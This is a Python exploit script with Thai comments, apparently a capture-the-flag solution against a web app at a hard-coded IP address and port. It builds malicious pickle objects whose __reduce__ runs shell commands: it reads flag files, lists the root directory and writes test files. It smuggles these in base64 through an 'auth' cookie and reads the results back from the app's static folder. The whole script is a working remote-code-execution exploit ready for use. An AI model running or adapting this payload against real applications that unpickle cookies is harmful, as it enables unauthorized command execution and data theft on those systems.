import requests
import pickle
import base64
import os
import time
import subprocess

# URL ของเว็บแอพ
url = '94.237.48.12:56323'

# ลองใช้คำสั่งที่ง่ายขึ้น
class RCE:
    def __reduce__(self):
        # ใช้ subprocess.call แทน os.system
        # และสร้างไฟล์ในโฟลเดอร์ที่แน่ใจว่าเขียนได้
        cmd = ['sh', '-c', 'cat /flag.txt > /app/application/static/flag.txt']
        return subprocess.call, (cmd,)

# สำหรับ debug - ลองใช้คำสั่งง่ายๆ ก่อน
class RCE_Debug:
    def __reduce__(self):
        # สร้างไฟล์ test เพื่อดูว่าการโจมตีทำงานไหม
        cmd = ['sh', '-c', 'echo "RCE Success" > /app/application/static/test.txt']
        return subprocess.call, (cmd,)

# ตัวเลือกที่ 3: ใช้ ls เพื่อดูไฟล์ทั้งหมด
class RCE_List:
    def __reduce__(self):
        cmd = ['sh', '-c', 'ls -la / > /app/application/static/ls.txt']
        return subprocess.call, (cmd,)

def exploit_debug():
    """ทดสอบการโจมตีก่อน"""
    print("[*] Testing RCE with debug payload...")
    pickled = pickle.dumps(RCE_Debug())
    r = requests.get(f'{url}/home', cookies={'auth': base64.urlsafe_b64encode(pickled).decode('utf-8')})
    print(f"[*] Response status: {r.status_code}")
    
    time.sleep(2)
    
    # ตรวจสอบไฟล์ test
    try:
        test_result = requests.get(f'{url}/static/test.txt')
        if test_result.status_code == 200:
            print("[+] RCE Success! Test file created")
            print(f"[+] Test content: {test_result.text}")
            return True
        else:
            print(f"[-] Test file not found, status: {test_result.status_code}")
    except Exception as e:
        print(f"[-] Error accessing test file: {e}")
    
    return False

def explore_filesystem():
    """ดูไฟล์ในระบบ"""
    print("[*] Exploring filesystem...")
    pickled = pickle.dumps(RCE_List())
    r = requests.get(f'{url}/home', cookies={'auth': base64.urlsafe_b64encode(pickled).decode('utf-8')})
    
    time.sleep(2)
    
    try:
        ls_result = requests.get(f'{url}/static/ls.txt')
        if ls_result.status_code == 200:
            print("[+] Directory listing:")
            print(ls_result.text)
        else:
            print(f"[-] Could not get directory listing, status: {ls_result.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")

def try_different_paths():
    """ลองหาไฟล์ flag ในตำแหน่งต่างๆ"""
    flag_paths = [
        '/flag.txt',
        '/flag',
        '/app/flag.txt',
        '/app/flag',
        '/root/flag.txt',
        '/home/flag.txt'
    ]
    
    for flag_path in flag_paths:
        print(f"[*] Trying to read flag from: {flag_path}")
        
        class RCE_Try:
            def __reduce__(self):
                cmd = ['sh', '-c', f'cat {flag_path} > /app/application/static/flag_{flag_path.replace("/", "_")}.txt 2>/dev/null || echo "Not found" > /app/application/static/flag_{flag_path.replace("/", "_")}.txt']
                return subprocess.call, (cmd,)
        
        pickled = pickle.dumps(RCE_Try())
        r = requests.get(f'{url}/home', cookies={'auth': base64.urlsafe_b64encode(pickled).decode('utf-8')})
        
        time.sleep(1)
        
        try:
            flag_result = requests.get(f'{url}/static/flag_{flag_path.replace("/", "_")}.txt')
            if flag_result.status_code == 200:
                print(f"[+] Result for {flag_path}: {flag_result.text.strip()}")
                if 'HTB{' in flag_result.text or 'FLAG{' in flag_result.text:
                    print(f"[+] Found flag in {flag_path}!")
                    return flag_result.text.strip()
        except Exception as e:
            print(f"[-] Error accessing {flag_path}: {e}")
    
    return None

def main():
    print("[*] Starting Pickle Deserialization Exploit")
    print("[*] Target:", url)
    
    # ทดสอบการเชื่อมต่อ
    try:
        r = requests.get(url)
        print(f"[+] Target is reachable, status: {r.status_code}")
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        return
    
    # ทดสอบการโจมตี
    if exploit_debug():
        print("[+] RCE confirmed! Proceeding...")
        
        # ดูไฟล์ในระบบ
        explore_filesystem()
        
        # ลองหา flag ในตำแหน่งต่างๆ
        flag = try_different_paths()
        
        if flag:
            print(f"[+] FLAG FOUND: {flag}")
        else:
            print("[-] Flag not found in common locations")
    else:
        print("[-] RCE test failed")

if __name__ == "__main__":
    main()